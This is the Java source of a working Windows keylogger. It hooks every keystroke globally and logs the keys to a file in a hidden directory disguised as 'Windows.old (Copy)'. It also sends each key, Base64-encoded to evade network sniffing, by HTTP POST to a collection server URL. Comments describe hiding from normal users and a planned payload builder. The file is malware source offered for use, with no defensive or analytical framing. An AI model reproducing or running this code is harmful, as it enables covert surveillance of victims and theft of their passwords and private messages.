package us.infinitydev.windows_keylogger;

import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

public class Keylogger {
	//Designate variables, To-Do: make a payload creator so you run a program, insert variables, you get keylogger jar
	
	private static String dirName = "C:\\Windows.old (Copy)\\";
	private static String fileName = "update_log.txt";
	
	private static boolean run = true;
	
	private static boolean web = true;
	private static final String url = "http://localhost:8080/x87Sjd9dO";
	
	public static void main(String[] args) throws Exception {
		//Make directory
		
		File dir = new File(dirName);
		dir.mkdirs();
		
		//Hide directory so normal users won't see it
		Path path = FileSystems.getDefault().getPath(dirName);
		Files.setAttribute(path, "dos:hidden", true);
		
		//Create log file
		File log = new File(dirName + fileName);
		if(log.exists()) {
			log.delete();
		}
		
		//Get ready to write to log file
		BufferedWriter outStream = new BufferedWriter(new FileWriter(dirName + fileName, true));
		PrintWriter printWriter = new PrintWriter (outStream);
		
		//Hook into keyboard
		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
		
		//Start listening for keys
		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
			@Override public void keyPressed(GlobalKeyEvent event){
				//Get id of key prepssed and get its name
				int id = Integer.valueOf(event.toString().split(" ")[0]);
				String print = getKey(id);
				printWriter.println(print);
				
				//If web functionally is enabled, send to KeyloggerServer
				if(web == true) {
						try {
						    URL obj = new URL(url);
						    //Create connection TODO make everything HTTPS
						    HttpURLConnection con = (HttpURLConnection)obj.openConnection();
						    
						    //Create request, send User Agent and Language
						    con.setRequestMethod("POST");
						    con.setRequestProperty("User-Agent", "Keylogger");
						    con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
						    
						    //Encode key pressed in Base64 so people sniffing with wireshark don't understand immediately
						    String encodedString = Base64.getEncoder().encodeToString(print.getBytes());
						    String urlParameters = "key=" + encodedString;
						    
						    //Sned away
						    con.setDoOutput(true);
						    DataOutputStream wr = new DataOutputStream(con.getOutputStream());
						    wr.writeBytes(urlParameters);
						    wr.flush();
						    wr.close();
						    
						    //Print response code
						    int responseCode = con.getResponseCode();
						    System.out.println("Response Code : " + responseCode);
						} catch (MalformedURLException e1) {
							e1.printStackTrace();
						} catch (IOException e1) {
							e1.printStackTrace();
						}
				}
				
				printWriter.flush();
			}
			@Override public void keyReleased(GlobalKeyEvent event) {
				//Don't need this, considering remeoving
			}
		});
		
		try {
			while(run) Thread.sleep(128);
		} catch(InterruptedException e) { }
			finally {keyboardHook.shutdownHook(); }
		
		//Leftover code from shutdown function
		printWriter.close();
		outStream.close();
		
	}
	
	private static String getKey(Integer id) {
		//Super long ASCII translation I probably could've found somewhere else and saved a lot of time on...
		//But I didn't
		String print = "";
		switch(id) {
		case 8:
			print = "Backspace";
			break;
		case 9:
			print = "Tab";
			break;
		case 13:
			print = "Enter";
			break;
		case 16:
			print = "Shift Key";
			break;
		case 17:
			print = "Ctrl";
			break;
		case 18:
			print = "Alt";
			break;
		case 19:
			print = "Pause/Break";
			break;
		case 20:
			print = "Caps Lock";
			break;
		case 27:
			print = "Escape";
			break;
		case 32:
			print = "Space Bar";
			break;
		case 33:
			print = "Page Up";
			break;
		case 34:
			print = "Page Down";
			break;
		case 35:
			print = "End";
			break;
		case 36:
			print = "Home";
			break;
		case 37:
			print = "Left Arrow";
			break;
		case 38:
			print = "Up Arrow";
			break;
		case 39:
			print = "Right Arrow";
			break;
		case 40:
			print = "Down Arrow";
			break;
		case 45:
			print = "Insert";
			break;
		case 46:
			print = "Delete";
			break;
		case 48:
			print = "0";
			break;
		case 49:
			print = "1";
			break;
		case 50:
			print = "2";
			break;
		case 51:
			print = "3";
			break;
		case 52:
			print = "4";
			break;
		case 53:
			print = "5";
			break;
		case 54:
			print = "6";
			break;
		case 55:
			print = "7";
			break;
		case 56:
			print = "8";
			break;
		case 57:
			print = "9";
			break;
		case 65:
			print = "a";
			break;
		case 66:
			print = "b";
			break;
		case 67:
			print = "c";
			break;
		case 68:
			print = "d";
			break;
		case 69:
			print = "e";
			break;
		case 70:
			print = "f";
			break;
		case 71:
			print = "g";
			break;
		case 72:
			print = "h";
			break;
		case 73:
			print = "i";
			break;
		case 74:
			print = "j";
			break;
		case 75:
			print = "k";
			break;
		case 76:
			print = "l";
			break;
		case 77:
			print = "m";
			break;
		case 78:
			print = "n";
			break;
		case 79:
			print = "o";
			break;
		case 80:
			print = "p";
			break;
		case 81:
			print = "q";
			break;
		case 82:
			print = "r";
			break;
		case 83:
			print = "s";
			break;
		case 84:
			print = "t";
			break;
		case 85:
			print = "u";
			break;
		case 86:
			print = "v";
			break;
		case 87:
			print = "w";
			break;
		case 88:
			print = "x";
			break;
		case 89:
			print = "y";
			break;
		case 90:
			print = "z";
			break;
		case 91:
			print = "Left Window Key";
			break;
		case 92:
			print = "Right Window Key";
			break;
		case 93:
			print = "Select Key";
			break;
		case 96:
			print = "Numpad 0";
			break;
		case 97:
			print = "Numpad 1";
			break;
		case 98:
			print = "Numpad 2";
			break;
		case 99:
			print = "Numpad 3";
			break;
		case 100:
			print = "Numpad 4";
			break;
		case 101:
			print = "Numpad 5";
			break;
		case 102:
			print = "Numpad 6";
			break;
		case 103:
			print = "Numpad 7";
			break;
		case 104:
			print = "Numpad 8";
			break;
		case 105:
			print = "Numpad 9";
			break;
		case 106:
			print = "Multiply";
			break;
		case 107:
			print = "Add";
			break;
		case 109:
			print = "Subtract";
			break;
		case 110:
			print = "Decimal Point";
			break;
		case 111:
			print = "Divide";
			break;
		case 112:
			print = "F1";
			break;
		case 113:
			print = "F2";
			break;
		case 114:
			print = "F3";
			break;
		case 115:
			print = "F4";
			break;
		case 116:
			print = "F5";
			break;
		case 117:
			print = "F6";
			break;
		case 118:
			print = "F7";
			break;
		case 119:
			print = "F8";
			break;
		case 120:
			print = "F9";
			break;
		case 121:
			print = "F10";
			break;
		case 122:
			print = "F11";
			break;
		case 123:
			print = "F12";
			break;
		case 144:
			print = "Num Lock";
			break;
		case 145:
			print = "Scroll Lock";
		case 186:
			print = "; (Semi-colon)";
			break;
		case 187:
			print = "= (Equals Sign)";
			break;
		case 188:
			print = ", (Comma)";
			break;
		case 189:
			print = "- (Dash)";
			break;
		case 190:
			print = ". (Period)";
			break;
		case 191:
			print = "/ (Forward Slash)";
			break;
		case 192:
			print = "Grave Accent";
			break;
		case 219:
			print = "[ (Open Bracket)";
			break;
		case 220:
			print = "\\ (Backslash)";
			break;
		case 221:
			print = "] (Close Bracket)";
			break;
		case 222:
			print = "' (Single Quote)";
			break;
		default:
			print = "Unknown Key";
			break;
		}
		return print;
	}

	
}
